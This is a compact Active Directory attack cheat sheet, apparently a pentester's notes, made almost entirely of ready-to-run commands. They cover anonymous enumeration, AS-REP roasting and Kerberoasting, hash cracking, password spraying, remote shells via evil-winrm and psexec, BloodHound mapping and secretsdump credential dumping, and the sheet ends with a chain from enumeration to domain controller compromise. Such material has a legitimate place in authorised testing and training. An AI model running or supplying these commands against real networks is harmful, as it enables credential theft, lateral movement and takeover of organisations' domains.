# 📇 Active Directory Cheat Sheet

> Scan-only. Full detail: [[Active Directory]] · [[Kerberos]] · [[LDAP]] · [[SMB]]. Set `DOMAIN=corp.local`, DC in `/etc/hosts`, and **sync the clock first**.

## 0) Fix clock (or Kerberos fails)
```bash
sudo ntpdate $IP
```

## 1) Enumerate (no/low creds)
```bash
rpcclient -U "" -N $IP -c "enumdomusers;getdompwinfo"     # users + lockout policy
```

```bash
netexec smb $IP -u '' -p '' --rid-brute                    # users when enum denied
```

```bash
ldapsearch -x -H ldap://$IP -b "dc=corp,dc=local" "(objectClass=user)" sAMAccountName description
```

## 2) Roast
```bash
kerbrute userenum -d corp.local --dc $IP users.txt
```

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -dc-ip $IP -format hashcat -o asrep.txt
```

```bash
impacket-GetUserSPNs corp.local/jdoe:'Pass' -dc-ip $IP -request -o kerb.txt
```

```bash
hashcat -m 18200 asrep.txt rockyou.txt      # AS-REP
```

```bash
hashcat -m 13100 kerb.txt  rockyou.txt      # Kerberoast
```

## 3) Spray / validate (mind lockout!)
```bash
netexec smb $IP -u users.txt -p 'Season2024!' --continue-on-success
```

## 4) Shell with a cred/hash
```bash
evil-winrm -i $IP -u user -p 'pass'                         # or -H <NThash>
```

```bash
impacket-psexec corp.local/user:'pass'@$IP                  # SYSTEM if admin
```

## 5) Map + dump
```bash
bloodhound-python -d corp.local -u user -p pass -c all -ns $IP
```

```bash
impacket-secretsdump corp.local/user:'pass'@$IP             # SAM/LSA/NTDS(on DC)
```
## Chain
enum (LDAP/RPC/kerbrute) → AS-REP/Kerberoast → crack → spray/lateral (SMB/WinRM) → BloodHound → DC → secretsdump/DCSync. Reuse every cred everywhere ([[Credential Attacks]]).
